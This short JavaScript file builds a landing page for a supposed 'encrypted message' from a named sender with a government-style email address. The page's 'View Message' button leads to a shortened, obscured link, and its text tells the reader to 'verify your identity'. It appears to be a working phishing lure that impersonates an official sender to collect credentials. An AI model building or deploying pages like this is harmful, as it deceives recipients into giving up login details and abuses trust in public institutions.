import './style.css'

const PROFILE_LINK = 'https://urlset.click/FqQanA'
const SENDER_NAME = 'Hannah Whitehair'
const SENDER_EMAIL = 'hannah.whitehair2026@pelrb.nm-gov'

document.querySelector('#app').innerHTML = `
  <div class="landing-container">
    <div class="message-card">

      <a href="${PROFILE_LINK}" class="view-message-btn">
        View Message
      </a>

      <div class="instruction-box">
        <h2 class="instruction-title">UNENCRYPTED INSTRUCTION</h2>
        <p class="instruction-text">
          To view my encrypted message, locate <strong>View Message</strong>, you'll need to verify your identity.
          Please contact me if you have any difficulty or questions.
        </p>
      </div>
    </div>
  </div>
`
